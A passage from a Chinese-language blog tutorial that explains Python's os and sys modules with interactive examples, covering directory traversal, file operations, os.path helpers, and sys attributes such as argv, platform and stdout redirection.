方法是一个简单易用的文件、目录遍历器，可以帮助我们高效的处理文件、目录方面的事情。在Unix，Windows中有效。</p><p>**walk()**方法语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; os.walk(top[, topdown=True[, onerror=None[, followlinks=False]]])</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><h3 id="参数"><a class="markdownIt-Anchor" href="#参数"></a> 参数</h3><ul><li><strong>top</strong> – 是你所要遍历的目录的地址, 返回的是一个三元组**(root,dirs,files)**。<ul><li><strong>root</strong> 所指的是当前正在遍历的这个文件夹的本身的地址</li><li><strong>dirs</strong> 是一个 list ，内容是该文件夹中所有的目录的名字(不包括子目录)</li><li><strong>files</strong> 同样是 list , 内容是该文件夹中所有的文件(不包括子目录)</li></ul></li><li><strong>topdown</strong> --可选，为 True，则优先遍历 top 目录，否则优先遍历 top 的子目录(默认为开启)。如果 topdown 参数为 True，walk 会遍历top文件夹，与top 文件夹中每一个子目录。</li><li><strong>onerror</strong> – 可选，需要一个 callable 对象，当 walk 需要异常时，会调用。</li><li><strong>followlinks</strong> – 可选，如果为 True，则会遍历目录下的快捷方式(linux 下是软连接 symbolic link )实际所指的目录(默认关闭)，如果为 False，则优先遍历 top 的子目录。</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(<span class="string">"E:\学习文件夹\二进制"</span>):</span><br><span class="line"><span class="meta">... </span>    print(<span class="string">"root:"</span>,root,<span class="string">"dirs:"</span>,dirs,<span class="string">"files:"</span>,files)</span><br><span class="line">...</span><br><span class="line">root: E:\学习文件夹\二进制 dirs: [<span class="string">'AFL'</span>, <span class="string">'CVE'</span>, <span class="string">'Pwn'</span>, <span class="string">'pwn 题工具'</span>, <span class="string">'程序理解'</span>] files: [<span class="string">'Understanding_ELF.pdf'</span>, <span class="string">'w.py'</span>]</span><br><span class="line">root: E:\学习文件夹\二进制\AFL dirs: [<span class="string">'afl'</span>, <span class="string">'AFL-master'</span>, <span class="string">'afl相关论文'</span>, <span class="string">'SmartContract'</span>] files: [<span class="string">'afl-gcc 源码分析.docx'</span>, <span class="string">'微信图片_20200729163941.jpg'</span>, <span class="string">'微信图片_20200729164006.jpg'</span>, <span class="string">'源码分析(1).doc'</span>]</span><br><span class="line">root: E:\学习文件夹\二进制\AFL\afl dirs: [<span class="string">'afl-nsga3'</span>, <span class="string">'nsga2'</span>] files: [<span class="string">'afl-data'</span>, <span class="string">'afl-data.txt'</span>, <span class="string">'afl-nsga3.tar'</span>, <span class="string">'data - 副本.xlsx'</span>, <span class="string">'data.xls'</span>, <span class="string">'data.xlsx'</span>, <span class="string">'e.py'</span>, <span class="string">'exp.py'</span>, <span class="string">'test.xlsx'</span>, <span class="string">'李硕.pptx'</span>]</span><br><span class="line">root: E:\学习文件夹\二进制\AFL\afl\afl-nsga3 dirs: [<span class="string">'afl-nsga3'</span>] files: []</span><br><span class="line">root: E:\学习文件夹\二进制\AFL\afl\afl-nsga3\afl-nsga3 dirs: [] files: [<span class="string">'afl-nsga3-test.cpp'</span>, <span class="string">'afl-nsga3.cpp'</span>, <span class="string">'afl-nsga3.h'</span>, <span class="string">'alg-test'</span>, <span class="string">'common.h'</span>, <span class="string">'fobjective.h'</span>, <span class="string">'global.h'</span>, <span class="string">'individual.h'</span>, <span class="string">'Makefile'</span>, <span class="string">'random.h'</span>, <span class="string">'recombination.h'</span>, <span class="string">'refpoint.h'</span>, <span class="string">'TestDTLZ2.txt'</span>]</span><br><span class="line">root: E:\学习文件夹\二进制\AFL\afl\nsga2 dirs: [<span class="string">'.git'</span>, <span class="string">'build'</span>, <span class="string">'examples'</span>, <span class="string">'metrics'</span>, <span class="string">'nsga2'</span>] files: [<span class="string">'.gitignore'</span>, <span class="string">'README.md'</span>, <span class="string">'setup.py'</span>]</span><br><span class="line">root: E:\学习文件夹\二进制\AFL\afl\nsga2\.git dirs: [<span class="string">'hooks'</span>, <span class="string">'info'</span>, <span class="string">'logs'</span>, <span class="string">'objects'</span>, <span class="string">'refs'</span>] files: [<span class="string">'config'</span>, <span class="string">'d</span></span><br></pre></td></tr></table></figure><blockquote><p>要和os.listdir()区分开来，os.listdir(path)只是返回当前目录下的文件和文件夹名，而os.walk(path)是将当前目录下以及每个文件夹中包含的文件全部返回</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.listdir(<span class="string">"E:\学习文件夹\二进制"</span>)</span><br><span class="line">[<span class="string">'AFL'</span>, <span class="string">'CVE'</span>, <span class="string">'Pwn'</span>, <span class="string">'pwn 题工具'</span>, <span class="string">'Understanding_ELF.pdf'</span>, <span class="string">'w.py'</span>, <span class="string">'程序理解'</span>]</span><br></pre></td></tr></table></figure><h4 id="4osmkdirpath-mode-方法"><a class="markdownIt-Anchor" href="#4osmkdirpath-mode-方法"></a> 4.os.mkdir(path[, mode]) 方法</h4><blockquote><p>创建目录，以数字mode的mode创建一个名为path的文件夹.默认的 mode 是 0777 (八进制)。</p><p><code>概述</code></p><p>os.mkdir() 方法用于以数字权限模式创建目录。默认的模式为 0777 (八进制)。</p><p>如果目录有多级，则创建最后一级，如果最后一级目录的上级目录有不存在的，则会抛出一个 OSError。</p><p><code>语法</code></p><p>**mkdir()**方法语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; os.mkdir(path[, mode])</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><code>参数</code></p><ul><li><strong>path</strong> – 要创建的目录，可以是相对或者绝对路径。</li><li><strong>mode</strong> – 要为目录设置的权限数字模式。</li></ul><p><code>返回值</code></p><p>该方法没有返回值。</p></blockquote><h4 id="5osrmdirpath-方法"><a class="markdownIt-Anchor" href="#5osrmdirpath-方法"></a> 5.os.rmdir(path) 方法</h4><blockquote><p><code>概述</code></p><p>os.rmdir() 方法用于删除指定路径的目录。仅当这文件夹是空的才可以, 否则, 抛出OSError。</p><p><code>语法</code></p><p>**rmdir()**方法语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; os.rmdir(path)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><code>参数</code></p><ul><li><strong>path</strong> – 要删除的目录路径</li></ul><p><code>返回值</code></p><p>该方法没有返回值</p></blockquote><h4 id="6ossystemshell-方法"><a class="markdownIt-Anchor" href="#6ossystemshell-方法"></a> 6.os.system(shell) 方法</h4><blockquote><p>运行shell命令</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">"ping www.baidu.com"</span>)</span><br><span class="line"></span><br><span class="line">正在 Ping www.a.shifen.com [<span class="number">2409</span>:<span class="number">8</span>c00:<span class="number">6</span>c21:<span class="number">104</span>f:<span class="number">0</span>:ff:b03f:<span class="number">3</span>ae] 具有 <span class="number">32</span> 字节的数据:</span><br><span class="line">来自 <span class="number">2409</span>:<span class="number">8</span>c00:<span class="number">6</span>c21:<span class="number">104</span>f:<span class="number">0</span>:ff:b03f:<span class="number">3</span>ae 的回复: 时间=<span class="number">184</span>ms</span><br><span class="line">来自 <span class="number">2409</span>:<span class="number">8</span>c00:<span class="number">6</span>c21:<span class="number">104</span>f:<span class="number">0</span>:ff:b03f:<span class="number">3</span>ae 的回复: 时间=<span class="number">136</span>ms</span><br><span class="line">来自 <span class="number">2409</span>:<span class="number">8</span>c00:<span class="number">6</span>c21:<span class="number">104</span>f:<span class="number">0</span>:ff:b03f:<span class="number">3</span>ae 的回复: 时间=<span class="number">140</span>ms</span><br><span class="line">来自 <span class="number">2409</span>:<span class="number">8</span>c00:<span class="number">6</span>c21:<span class="number">104</span>f:<span class="number">0</span>:ff:b03f:<span class="number">3</span>ae 的回复: 时间=<span class="number">181</span>ms</span><br><span class="line"></span><br><span class="line"><span class="number">2409</span>:<span class="number">8</span>c00:<span class="number">6</span>c21:<span class="number">104</span>f:<span class="number">0</span>:ff:b03f:<span class="number">3</span>ae 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 = <span class="number">4</span>，已接收 = <span class="number">4</span>，丢失 = <span class="number">0</span> (<span class="number">0</span>% 丢失)，</span><br><span class="line">往返行程的估计时间(以毫秒为单位):</span><br><span class="line">    最短 = <span class="number">136</span>ms，最长 = <span class="number">184</span>ms，平均 = <span class="number">160</span>ms</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><h4 id="7osrenamesold-new-方法"><a class="markdownIt-Anchor" href="#7osrenamesold-new-方法"></a> 7.os.renames(old, new) 方法</h4><blockquote><p><code>概述</code></p><p>os.renames() 方法用于递归重命名目录或文件。类似rename()。</p><p><code>语法</code></p><p>**renames()**方法语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; os.renames(old, new)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><code>参数</code></p><ul><li><strong>old</strong> – 要重命名的目录</li><li><strong>new</strong> --文件或目录的新名字。甚至可以是包含在目录中的文件，或者完整的目录树。</li></ul><p><code>返回值</code></p><p>该方法没有返回值</p></blockquote><h4 id="8ospath-模块"><a class="markdownIt-Anchor" href="#8ospath-模块"></a> 8.os.path 模块</h4><p>os.path 模块主要用于获取文件的属性。</p><blockquote><p>以下是 os.path 模块的几种常用方法：</p></blockquote><table><thead><tr><th style="text-align:left">方法</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">os.path.abspath(path)</td><td style="text-align:left">返回绝对路径</td></tr><tr><td style="text-align:left">os.path.basename(path)</td><td style="text-align:left">返回文件名</td></tr><tr><td style="text-align:left">os.path.commonprefix(list)</td><td style="text-align:left">返回list(多个路径)中，所有path共有的最长的路径</td></tr><tr><td style="text-align:left">os.path.dirname(path)</td><td style="text-align:left">返回文件路径</td></tr><tr><td style="text-align:left"><strong>os.path.exists(path)</strong></td><td style="text-align:left">如果路径 path 存在，返回 True；如果路径 path 不存在，返回 False。</td></tr><tr><td style="text-align:left">os.path.lexists</td><td style="text-align:left">路径存在则返回True,路径损坏也返回True</td></tr><tr><td style="text-align:left">os.path.expanduser(path)</td><td style="text-align:left">把path中包含的&quot;<sub>&quot;和&quot;</sub>user&quot;转换成用户目录</td></tr><tr><td style="text-align:left">os.path.expandvars(path)</td><td style="text-align:left">根据环境变量的值替换path中包含的&quot;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">和</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">name&quot;和&quot;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord">&quot;</span><span class="mord cjk_fallback">和</span><span class="mord">&quot;</span></span></span></span>{name}&quot;</td></tr><tr><td style="text-align:left"><strong>os.path.getatime(path)</strong></td><td style="text-align:left">返回最近访问时间（浮点型秒数）</td></tr><tr><td style="text-align:left"><strong>os.path.getmtime(path)</strong></td><td style="text-align:left">返回最近文件修改时间</td></tr><tr><td style="text-align:left"><strong>os.path.getctime(path)</strong></td><td style="text-align:left">返回文件 path 创建时间</td></tr><tr><td style="text-align:left"><strong>os.path.getsize(path)</strong></td><td style="text-align:left">返回文件大小，如果文件不存在就返回错误</td></tr><tr><td style="text-align:left">os.path.isabs(path)</td><td style="text-align:left">判断是否为绝对路径</td></tr><tr><td style="text-align:left"><strong>os.path.isfile(path)</strong></td><td style="text-align:left">判断路径是否为文件</td></tr><tr><td style="text-align:left"><strong>os.path.isdir(path)</strong></td><td style="text-align:left">判断路径是否为目录</td></tr><tr><td style="text-align:left">os.path.islink(path)</td><td style="text-align:left">判断路径是否为链接</td></tr><tr><td style="text-align:left">os.path.ismount(path)</td><td style="text-align:left">判断路径是否为挂载点</td></tr><tr><td style="text-align:left">os.path.join(path1[, path2[, …]])</td><td style="text-align:left">把目录和文件名合成一个路径</td></tr><tr><td style="text-align:left">os.path.normcase(path)</td><td style="text-align:left">转换path的大小写和斜杠</td></tr><tr><td style="text-align:left">os.path.normpath(path)</td><td style="text-align:left">规范path字符串形式</td></tr><tr><td style="text-align:left">os.path.realpath(path)</td><td style="text-align:left">返回path的真实路径</td></tr><tr><td style="text-align:left">os.path.relpath(path[, start])</td><td style="text-align:left">从start开始计算相对路径</td></tr><tr><td style="text-align:left">os.path.samefile(path1, path2)</td><td style="text-align:left">判断目录或文件是否相同</td></tr><tr><td style="text-align:left">os.path.sameopenfile(fp1, fp2)</td><td style="text-align:left">判断fp1和fp2是否指向同一文件</td></tr><tr><td style="text-align:left">os.path.samestat(stat1, stat2)</td><td style="text-align:left">判断stat tuple stat1和stat2是否指向同一个文件</td></tr><tr><td style="text-align:left">os.path.split(path)</td><td style="text-align:left">把路径分割成 dirname 和 basename，返回一个元组</td></tr><tr><td style="text-align:left">os.path.splitdrive(path)</td><td style="text-align:left">一般用在 windows 下，返回驱动器名和路径组成的元组</td></tr><tr><td style="text-align:left">os.path.splitext(path)</td><td style="text-align:left">分割路径，返回路径名和文件扩展名的元组</td></tr><tr><td style="text-align:left">os.path.splitunc(path)</td><td style="text-align:left">把路径分割为加载点与文件</td></tr><tr><td style="text-align:left">os.path.walk(path, visit, arg)</td><td style="text-align:left">遍历path，进入每个目录都调用visit函数，visit函数必须有3个参数(arg, dirname, names)，dirname表示当前目录的目录名，names代表当前目录下的所有文件名，args则为walk的第三个参数</td></tr><tr><td style="text-align:left">os.path.supports_unicode_filenames</td><td style="text-align:left">设置是否支持unicode路径名</td></tr></tbody></table><h3 id="0x09-sys-模块"><a class="markdownIt-Anchor" href="#0x09-sys-模块"></a> 0x09 sys 模块</h3><blockquote><p>本部分参考了<a href="http://www.ityouknow.com/python/2019/10/09/python-sys-demonstration-028.html" target="_blank" rel="noopener">第28天：Python 标准库之 sys 模块详解</a></p></blockquote><p><code>与OS的区别</code><a href="https://www.zhihu.com/question/31843617" target="_blank" rel="noopener">https://www.zhihu.com/question/31843617</a></p><blockquote><p>os与sys模块的官方解释如下：</p><ul><li>os: This module provides a portable way of using operating system dependent functionality. 这个模块提供了一种方便的使用操作系统函数的方法。</li><li>sys: This module provides access to some variables used or maintained by the interpreter and to functions that interact strongly with the interpreter. 这个模块可供访问由解释器使用或维护的变量和与解释器进行交互的函数。</li></ul><p><code>总结</code>：<br>os模块负责<strong>程序与操作系统</strong>的交互，提供了访问<strong>操作系统底层的接口</strong>;sys模块<strong>负责程序与python解释器</strong>的交互，提供了一系列的函数和变量，用于操控python的运行时环境。</p><ul><li><p>os就是一个普通的python库，用来向Python程序提供运行环境，特别是在文件系统、创建新进程、获取操作系统本身的一些信息（比如uname)，并屏蔽各种不同操作系统之间的细节差异。</p></li><li><p>sys模块则是python程序用来请求解释器行为的接口。比如关于调试类的（trace, frames，except）等，profiling类（stats， getsizeof)，运行时环境类（python path, stderr, stdout)，解释器本身（如version）。inspect某种程度上可以看成是在sys提供的功能上的一个包装。</p></li></ul><p>一个python程序可以不用到os，但无法避免sys的介入（尽管你可能并不import它）。</p></blockquote><h4 id="1sysargv"><a class="markdownIt-Anchor" href="#1sysargv"></a> 1.sys.argv</h4><blockquote><p>argv”即“argument value”的简写，是一个列表对象，其中存储的是在命令行调用 Python 脚本时提供的“命令行参数”。这个列表中的第一个参数是被调用的脚本名称，也就是说，调用 Python 解释器的“命令”（<code>python</code>）本身并没有被加入这个列表当中。这个地方要注意一下，因为这一点跟 C 程序的行为有所不同，C 程序读取命令行参数是从头开始的。</p></blockquote><p>举例来说，在当前目录下新建一个 Python 文件<code>sys_argv_example.py</code>，其内容为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">print(<span class="string">"The list of command line arguments:\n"</span>, sys.argv)</span><br></pre></td></tr></table></figure><p>在命令行运行该脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python sys_argv_example.py</span><br><span class="line">The list of command line arguments:</span><br><span class="line"> [<span class="string">'example.py'</span>]</span><br></pre></td></tr></table></figure><p>加上几个参数试试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python sys_argv_example.py arg1 arg2 arg3</span><br><span class="line">The list of command line arguments:</span><br><span class="line"> [<span class="string">'example.py'</span>, <span class="string">'arg1'</span>, <span class="string">'arg2'</span>, <span class="string">'arg3'</span>]</span><br></pre></td></tr></table></figure><p>利用好这个属性，可以极大增强 Python 脚本的交互性。</p><h4 id="2sysplatform"><a class="markdownIt-Anchor" href="#2sysplatform"></a> 2.sys.platform</h4><p>查看<code>sys</code>模块中的<code>sys.platform</code>属性可以得到关于运行平台更详细的信息”，这里我们就来试试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.platform</span><br><span class="line"><span class="string">'win32'</span></span><br></pre></td></tr></table></figure><p>在 Linux 上：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.platform</span><br><span class="line"><span class="string">'linux'</span></span><br></pre></td></tr></table></figure><p>比较一下<code>os.name</code>的结果，不难发现，<code>sys.platform</code>的信息更加准确。</p><h4 id="3sysbyteorder"><a class="markdownIt-Anchor" href="#3sysbyteorder"></a> 3.sys.byteorder</h4><p>“byteorder”即“字节序”，指的是在计算机内部存储数据时，数据的低位字节存储在存储空间中的高位还是低位。</p><p>“小端存储”时，数据的低位也存储在存储空间的低位地址中，此时<code>sys.byteorder</code>的值为<code>“little”</code>。如果不注意，在按地址顺序打印内容的时候，可能会把小端存储的内容打错。当前<strong>大部分机器</strong>都是使用的小端存储。</p><p>所以不出意外的话，你的机器上执行下述交互语句也应当跟我的结果一样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.byteorder</span><br><span class="line"><span class="string">'little'</span></span><br></pre></td></tr></table></figure><p>而另外还存在一种存储顺序是“大端存储”，即数据的高位字节存储在存储空间的低位地址上，此时<code>sys.byteorder</code>的值为<code>“big”</code>。</p><p>这种方式看起来好像很合理也很自然，因为我们一般在书面表示的时候都将低位地址写在左边，高位地址写在右边，大端存储的顺序就很符合人类的阅读习惯。但实际上对机器而言，内存地址并没有左右之分，所谓的“自然”其实并不存在。</p><p>抱歉我并没有使用大端存储的机器可以用作演示，因此只能说如果是大端存储的机器上运行 Python，输出结果应该像下面这样，也就是说下面这个示例并非我得到的真实运行结果，仅供参考：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.byteorder</span><br><span class="line"><span class="string">'big'</span></span><br></pre></td></tr></table></figure><h4 id="4sysexecutable"><a class="markdownIt-Anchor" href="#4sysexecutable"></a> 4.sys.executable</h4><p>该属性是一个字符串，在正常情况下，其值是当前运行的 Python 解释器对应的可执行程序所在的绝对路径。</p><p>比如在 Windows 上使用 Anaconda 安装的 Python，该属性的值就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.executable</span><br><span class="line"><span class="string">'E:\\Anaconda\\Anaconda\\python.exe'</span></span><br></pre></td></tr></table></figure><h4 id="5sysmodules"><a class="markdownIt-Anchor" href="#5sysmodules"></a> 5.sys.modules</h4><p>该属性是一个字典，包含的是各种已加载的模块的模块名到模块具体位置的映射。</p><p>通过手动修改这个字典，可以重新加载某些模块；但要注意，切记不要大意删除了一些基本的项，否则可能会导致 Python 整个儿无法运行。关于其具体的值，由于内容过多，就不在此给出示例了，</p><h4 id="6sysbuiltin_module_names"><a class="markdownIt-Anchor" href="#6sysbuiltin_module_names"></a> 6.sys.builtin_module_names</h4><p>该属性是一个字符串元组，其中的元素均为当前所使用的的 Python 解释器内置的模块名称。</p><p>注意区别<code>sys.modules</code>和<code>sys.builtin_module_names</code>——前者的关键字（keys）列出的是导入的模块名，而后者则是解释器内置的模块名。</p><p>其值示例如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sys.builtin_module_names</span><br><span class="line">(&apos;_abc&apos;, &apos;_ast&apos;, &apos;_bisect&apos;, &apos;_blake2&apos;, &apos;_codecs&apos;, &apos;_codecs_cn&apos;, &apos;_codecs_hk&apos;, &apos;_codecs_iso2022&apos;, &apos;_codecs_jp&apos;, &apos;_codecs_kr&apos;, &apos;_codecs_tw&apos;, &apos;_collections&apos;, &apos;_contextvars&apos;, &apos;_csv&apos;, &apos;_datetime&apos;, &apos;_functools&apos;, &apos;_heapq&apos;, &apos;_imp&apos;, &apos;_io&apos;, &apos;_json&apos;, &apos;_locale&apos;, &apos;_lsprof&apos;, &apos;_md5&apos;, &apos;_multibytecodec&apos;, &apos;_opcode&apos;, &apos;_operator&apos;, &apos;_pickle&apos;, &apos;_random&apos;, &apos;_sha1&apos;, &apos;_sha256&apos;, &apos;_sha3&apos;, &apos;_sha512&apos;, &apos;_signal&apos;, &apos;_sre&apos;, &apos;_stat&apos;, &apos;_string&apos;, &apos;_struct&apos;, &apos;_symtable&apos;, &apos;_thread&apos;, &apos;_tracemalloc&apos;, &apos;_warnings&apos;, &apos;_weakref&apos;, &apos;_winapi&apos;, &apos;array&apos;, &apos;atexit&apos;, &apos;audioop&apos;, &apos;binascii&apos;, &apos;builtins&apos;, &apos;cmath&apos;, &apos;errno&apos;, &apos;faulthandler&apos;, &apos;gc&apos;, &apos;itertools&apos;, &apos;marshal&apos;, &apos;math&apos;, &apos;mmap&apos;, &apos;msvcrt&apos;, &apos;nt&apos;, &apos;parser&apos;, &apos;sys&apos;, &apos;time&apos;, &apos;winreg&apos;, &apos;xxsubtype&apos;, &apos;zipimport&apos;, &apos;zlib&apos;)</span><br></pre></td></tr></table></figure><h4 id="7syspath"><a class="markdownIt-Anchor" href="#7syspath"></a> 7.sys.path</h4><p>A list of strings that specifies the search path for modules. Initialized from the environment variable <a href="https://docs.python.org/3/using/cmdline.html#envvar-PYTHONPATH" target="_blank" rel="noopener"><code>PYTHONPATH</code></a>, plus an installation-dependent default.</p><p>该属性是一个由字符串组成的列表，其中各个元素表示的是 Python 搜索模块的路径；在程序启动期间被初始化。</p><p>其中第一个元素（也就是<code>path[0]</code>）的值是最初调用 Python 解释器的脚本所在的绝对路径；如果是在交互式环境下查看<code>sys.path</code>的值，就会得到一个空字符串。</p><p>命令行运行脚本（脚本代码见示例 <code>sys_path_example.py</code>）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python sys_path_example.py</span><br><span class="line">The path[0] =  D:\justdopython\sys_example</span><br></pre></td></tr></table></figure><p>交互式环境查看属性第一个元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sys.path[0]</span><br><span class="line">&apos;&apos;</span><br></pre></td></tr></table></figure><h4 id="8sysstdin"><a class="markdownIt-Anchor" href="#8sysstdin"></a> 8.sys.stdin</h4><p>即 Python 的标准输入通道。通过改变这个属性为其他的类文件（file-like）对象，可以实现输入的重定向，也就是说可以用其他内容替换标准输入的内容。</p><p>所谓“标准输入”，实际上就是通过键盘输入的字符。</p><p>在示例（<code>sys_stdin_example.py</code>）中，我们尝试把这个属性的值改为一个打开的文件对象<code>hello_python.txt</code>，其中包含如下的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hello Python!</span><br><span class="line">Just do Python, go~</span><br><span class="line"></span><br><span class="line">Go, Go, GO!</span><br></pre></td></tr></table></figure><p>由于<code>input()</code>使用的就是标准输入流，因此通过修改<code>sys.stdin</code>的值，我们使用老朋友<code>input()</code>函数，也可以实现对文件内容的读取，程序运行效果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python sys_stdin_example.py</span><br><span class="line">Hello Python!</span><br><span class="line">Just do Python, go~</span><br><span class="line"></span><br><span class="line">Go, Go, GO!</span><br></pre></td></tr></table></figure><h4 id="9sysstdout"><a class="markdownIt-Anchor" href="#9sysstdout"></a> 9.sys.stdout</h4><p>与上一个“标准输入”类似，<code>sys.stdout</code>则是代表“标准输出”的属性。</p><p>通过将这个属性的值修改为某个文件对象，可以将本来要打印到屏幕上的内容写入文件。</p><p>比如运行示例程序<code>sys_stdout_example.py</code>，用来临时生成日志也是十分方便的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 以附加模式打开文件，若不存在则新建</span><br><span class="line">with open(&quot;count_log.txt&quot;, &apos;a&apos;, encoding=&apos;utf-8&apos;) as f:</span><br><span class="line">    sys.stdout = f</span><br><span class="line">    for i in range(10):</span><br><span class="line">        print(&quot;count = &quot;, i)</span><br></pre></td></tr></table></figure><p><code>从控制台重定向到文件</code></p><blockquote><p>stdout 和 print 可以结合使用的案例。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">file = sys.stdout    <span class="comment"># 存储原始的输出对象</span></span><br><span class="line">sys.stdout = open(<span class="string">'1.txt'</span>, <span class="string">'w'</span>)  <span class="comment"># 重定向所有的写入内容到 1.txt 文件</span></span><br><span class="line">print(<span class="string">'Citizen_Wang'</span>)   <span class="comment"># 写入到 1.txt 文件中</span></span><br><span class="line">print(<span class="string">'Always fall in love with neighbours'</span>)  <span class="comment"># 继续写入到文件中</span></span><br><span class="line">sys.stdout.close()    <span class="comment"># 其实就是 open 文件之后的关闭</span></span><br><span class="line">sys.stdout = file  <span class="comment"># 将 print 命令的结果返回给控制台</span></span><br><span class="line">print(<span class="string">'输出信息返回在控制台'</span>)  <span class="comment"># 该信息会在控制台也显示12345678</span></span><br></pre></td></tr></table></figure><p>在当前目录下创建了一个 1.txt 文件，内容如下：</p><blockquote><p>Citizen_Wang<br>Always fall in love with neighbours</p></blockquote><h4 id="9sysstdoutwrite"><a class="markdownIt-Anchor" href="#9sysstdoutwrite"></a> 9+.sys.stdout.write</h4><blockquote><p>这个方法，调用的就是 file 对象的 write 方法，区别是 file 对象的 write 方法吧字符写入到文件中，sys.stdout.write 方法把字符写入到标准输出中，也就是控制台。</p><ul><li>print 几乎可以打印所有的对象，而 stdout.write 只能接受 str 类型。</li><li>stdout.write 默认不换行，print 默认换行</li></ul></blockquote><h4 id="10syserr"><a class="markdownIt-Anchor" href="#10syserr"></a> 